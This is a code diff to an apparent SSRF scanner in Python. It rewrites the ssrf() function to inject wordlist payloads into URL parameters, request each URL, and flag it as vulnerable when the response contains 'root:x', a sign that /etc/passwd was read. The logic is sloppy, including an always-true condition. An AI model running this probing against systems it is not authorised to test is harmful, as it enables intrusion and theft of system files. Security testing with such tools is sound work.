@@ -91,26 +91,42 @@ user_agents = [
 user_agent = random.choice (user_agents)
 headers = {'User-Agent': user_agent}
 
-def ssrf(l,w,urls_vulnerables):
+def ssrf(l,wi,urls_vulnerables):
     print()
     print('---------------------')
-    print('\033[1;36m Testing SSRF parameters:\033[0m') 
+    print('\033[1;36m Testing SSRF:\033[0m') 
     print('---------------------')
     print()
     limp=''
     found=0
-    for linea in l:   
+    for linea in l:
      for li in wordlist:
          if li in linea:
-             found= found + 1
-             if found == 1:
-                 urls_vulnerables.append('\n****************** PARAMETERS TO SSRF: *********************\n')
-             print('\033[1;32m[+]\033[0m ' + linea)
-             urls_vulnerables.append(linea)
+            for line in l:
+                for w in wi:
+                     if 'FUZZ' in line:
+                         line= line.replace('=FUZZ',f'={w}')
+                         line= line.replace(' ','%20')
+                     elif '=' and not 'FUZZ' in line:
+                         line= line.replace('=',f'={w}')
+                         line= line.replace(' ','%20')                         
+                     try:
+                         req= requests.get(line,headers=headers,timeout=50)
+                         body= str(urlopen(line).read()).lower()
+                         if 'root:x' in body:
+                             found= found + 1
+                             if found == 1:
+                                 urls_vulnerables.append('\n****************** VULNERABLE TO SSRF: *********************\n')             
+                             print ('\033[1;32m[+]\033[0m ' + linea)
+                             urls_vulnerables.append(linea)  
+                     except:
+                         continue
+                     line= line.replace('%20',' ')
+                     line= line.replace(f'{w}',limp)
          else:
-             continue
+             continue 
     if found >= 1:
      print()   
-     print (f'\033[1;32m[+] Found [{found}] SSRF parameter/s"\033[0m')   
+     print (f'\033[1;32m[+] Found [{found}] SSRF parameter/s"\033[0m')
     else:
-     print("\033[1;31m[-] No results found\033[0m")        
+     print("\033[1;31m[-] No results found\033[0m")
